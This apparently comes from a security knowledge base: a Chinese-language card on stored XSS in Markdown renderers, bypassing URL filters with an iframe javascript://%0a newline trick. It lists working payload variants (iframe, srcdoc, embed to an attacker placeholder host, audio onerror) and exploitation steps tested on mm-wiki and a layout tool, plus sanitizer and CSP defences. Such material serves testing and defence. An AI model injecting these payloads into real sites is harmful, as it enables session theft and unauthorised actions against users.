---
id: web-generic-xss-markdown-iframe-javascript-scheme-newline
title: Markdown 渲染 XSS：iframe javascript://%0a 换行绕过 URL 过滤，配合 embed/audio 等少见标签探测
type: scenario
domain: web
path: web/generic/xss
technique: markdown-iframe-javascript-scheme-newline-xss
aliases:
- Markdown XSS 少见标签
- iframe javascript://%0a
- javascript 伪协议换行绕过
- embed src 嵌入页面
- audio onerror
- mm-wiki Markdown XSS
- 微信排版工具 XSS
tags:
- web
- xss
- markdown
- iframe
- javascript-scheme
- filter-bypass
- html-sanitize
- mm-wiki
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V491
  verified_at: '2026-11-10T23:56:40+08:00'
  notes: 已对照原文全文与21/21图核对：<iframe src=javascript://%0aalert('iframe')> 在mm-wiki(127.0.0.1:8089)同源弹窗、在线排版工具弹窗、embed外部页(c0olw.github.io)弹窗、常见payload不生效与audio/embed探测，均与图一致；卡片正确区分了embed外部源执行不等于同源XSS。与既有encoding混淆、scriptless vectors、goldmark实体绕过、data:iframe-postmessage卡为不同绕过点，非重复；无sources/文章ID/URL(仅attacker占位)/长段摘录，路径web/generic/xss合法；原文未给产品受影响版本，versions为空
---

## 一句话结论

当 Markdown 渲染器允许原生 HTML、黑名单只拦常见标签/属性时，换用 `iframe`、`embed`、`audio` 等较少被过滤的标签更容易触发脚本；其中 `<iframe src=javascript://%0aalert('iframe')></iframe>` 在 `javascript:` 后插入 `//` 注释与 `%0a` 换行，可绕过简单的 `javascript:`/`alert` 字符串匹配，并在目标站源内执行脚本（文中在 mm-wiki 文档页与某在线微信排版工具上均弹窗成功）。

## 原理

- **Markdown 渲染与 HTML 透传**：不少 Markdown 实现默认允许内联 HTML（或只过滤 `<script>` 等少数标签），渲染结果直接写入页面；攻击者可用 HTML 标签而非 Markdown 语法注入。
- **少见标签绕过黑名单**：黑名单常覆盖 `<script>`、`onerror`、`onload` 等高频向量，但 `iframe`、`embed`、`audio`、`object` 等标签容易被遗漏。`<audio src=x onerror=confirm("x")>` 依赖加载失败触发事件；`<embed src="https://attacker/1.html">` 会嵌入攻击者页面（注意：嵌入页面的脚本在**外部页面自己的源**执行，并不等于目标站同源 XSS，文中该弹窗来自嵌入页，不能作为同源执行证据）。
- **javascript: 伪协议换行绕过**：`<iframe src=javascript://%0aalert('iframe')>` 中 `javascript:` 后的 `//` 开始一段注释，`%0a` 解码为换行后 `alert('iframe')` 才会执行。简单过滤器若只检查 `javascript:` 后是否紧跟代码或直接匹配 `alert(` 字符串，可能放过这种带注释/换行的形式；浏览器会按 URL 解析并执行其中的脚本，脚本运行在 iframe 所属页面的源内，构成真正的同源 XSS。
- **实测效果**：文章在 mm-wiki 文档编辑器中写入上述 iframe payload，浏览 `/document/index?document_id=3` 时页面弹出 `127.0.0.1:8089 显示 iframe`，证明脚本在目标站源执行；在在线排版工具中同一 payload 也弹出以目标域名标识的对话框。

## 触发条件

- Markdown 渲染器允许 `iframe` 标签及其 `src` 属性原样输出（未使用严格 allowlist 净化）。
- 渲染器/前置 WAF 对 `javascript:` 协议、`alert` 等关键字的过滤可被 `//` 注释 + `%0a`/换行打断；或只拦 `<script>` 与 `onerror` 等常见向量。
- 内容可被持久化（wiki 文档、文章、评论）并被其他用户查看，或输入可反射到页面；反射型危害有限，存储型可窃取会话/发起操作。

## 利用步骤

1. 在可编辑的 Markdown 内容中插入 `<iframe src=javascript://%0aalert('iframe')></iframe>`，保存后查看渲染页。
2. 若被拦截，按序尝试变体：
   ```html
   <iframe src="javascript://%0aalert(document.domain)"></iframe>
   <iframe src="javascript://%250aalert(1)"></iframe>
   <iframe src="java%0ascript:alert(1)"></iframe>
   <iframe srcdoc="<script>alert(1)</script>"></iframe>
   <embed src="https://attacker.example/x.html">
   <audio src=x onerror=alert(1)>
   ```
3. 若 `iframe` 被过滤，测试 `object`/`embed`/`audio`/`video`/`svg` 等标签与 `onerror`/`onload` 事件；也可尝试 HTML 实体、URL 编码、大小写混合绕过关键字匹配。
4. 确认脚本执行源（弹窗中显示的域名）以区分同源 XSS 与外部页面嵌入；同源执行才可用于读取 Cookie/DOM、发起带凭据请求等后续利用。

## PoC

最小 payload（文章实测）：

```html
<iframe src=javascript://%0aalert('iframe')>
```

其他探测用 payload：

```html
<embed src="https://attacker.example/x.html">
<audio src=x onerror=confirm("casrc")>
<img src="javascript:alert(12)">
```

## 变体与关联

- 关联：[[web-generic-xss-scriptless-execution-vectors]]（无脚本标签的 XSS 向量）、[[web-generic-xss-backend-script-style-blacklist-api-bypass]]（黑名单绕过）、[[web-generic-xss-goldmark-markdown-entity-url-check]]（Markdown 渲染器的 URL 检查缺陷）、[[web-generic-xss-markdown-viewer-lfi-htpasswd-ssh]]（Markdown 渲染链文件读取）、[[ctf-web-bot-report-javascript-scheme-xss-exfil]]（javascript: 伪协议与外带）。
- 变体：`javascript:` 可替换为 `java\tscript:`、`java%0ascript:`、`&#106;avascript:` 等编码/空白形式；事件型可用 `onerror`/`onload`/`onfocus`；嵌入型可用 `srcdoc`、`data:`（受 CSP 限制）。
- 边界：严格 allowlist 净化（DOMPurify、markdown-it-sanitize）或 CSP（禁 `unsafe-inline`、限制 frame-src）可阻断；`embed` 外部页面的脚本执行在外部源，不等于拿到目标站权限；文章只以弹窗证明执行，未展示会话窃取等完整利用。

## 检测与防御

- **净化**：Markdown 渲染使用成熟 sanitizer（DOMPurify、bleach、markdown-it-sanitize）并采用标签/属性 allowlist，移除 `iframe`/`embed`/`object` 等嵌入标签与事件属性；对 URL 协议做 allowlist（仅 http/https/mailto）。
- **规范化后再匹配**：过滤前先做 URL 解码、HTML 实体解码、去注释/换行规范化，避免 `javascript://%0a` 这类形式绕过。
- **CSP**：设置 `script-src`/`frame-src` 限制，禁止内联脚本与不可信框架；对用户生成内容使用独立子域隔离。
- **检测**：审计渲染输出中的 `javascript:`、`iframe`、`embed`、`onerror` 等模式；对存储型内容做入库/展示双重过滤；出现同源弹窗/异常脚本执行时按 XSS 事件处置。
